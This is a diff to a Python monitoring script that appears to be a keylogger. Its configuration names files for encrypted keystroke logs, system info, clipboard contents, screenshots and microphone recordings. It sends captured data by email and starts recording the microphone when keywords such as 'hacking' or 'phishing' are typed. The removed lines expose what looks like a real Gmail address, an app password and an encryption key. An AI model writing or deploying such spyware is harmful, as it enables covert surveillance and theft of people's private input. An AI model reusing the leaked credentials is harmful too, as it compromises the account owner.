@@ -50,21 +50,21 @@ forbidden_keywords = ["cybercrime", "crime", "cybersecurity", "hacking", "phishi
     "bit"]
 
 # Your email configuration
-sender_email = 'vignesh01ak@gmail.com'
-receiver_email = 'vignesh01ak@gmail.com'
-email_password = 'jmlqogpwksrjpnaw'
+sender_email = ' '
+receiver_email = ''
+email_password = 'This means Email passkey'
 
 # Define paths for storing encrypted data
-keylog_file_path = r'D:\key\stroker\keylog_encrypted.txt'
-sys_file_path = r'D:\key\stroker\systeminfo_encrypted.txt'
-clipboard_file_path = r'D:\key\stroker\clipboard_encrypted.txt'
-screenshot_file_path = r'D:\key\stroker\screenshot_encrypted.png'
+keylog_file_path = 'FILE PATH:where you want to save'
+sys_file_path = 'FILE PATH:where you want to save'
+clipboard_file_path = 'FILE PATH:where you want to save'
+screenshot_file_path = 'FILE PATH:where you want to save'
 
 # Initialize a variable to store the time when forbidden words were detected
 forbidden_words_detected_time = None
 
 # Generate or load the encryption key
-key = b'T3Xt6h9CTuNhCC2WSHy1UASL7KG2oO-8xlaoCDwi9U0='  # Replace with your actual encryption key
+key = ''  # Replace with your actual encryption key
 cipher_suite = Fernet(key)
 
 # Initialize a list to store the captured keystrokes
@@ -235,7 +235,7 @@ def record_microphone_and_save(filename):
 # Function to trigger when forbidden keywords are detected
 def forbidden_keywords_triggered():
     print("Forbidden keywords detected! Initiating microphone recording.")
-    audio_filename = r'D:\key\stroker\microphone_recording.wav'  # Change the path and filename as needed
+    audio_filename = 'FILE PATH:where you want to save'  # Change the path and filename as needed
     record_microphone_and_save(audio_filename)
     # You can add further processing here if needed
 
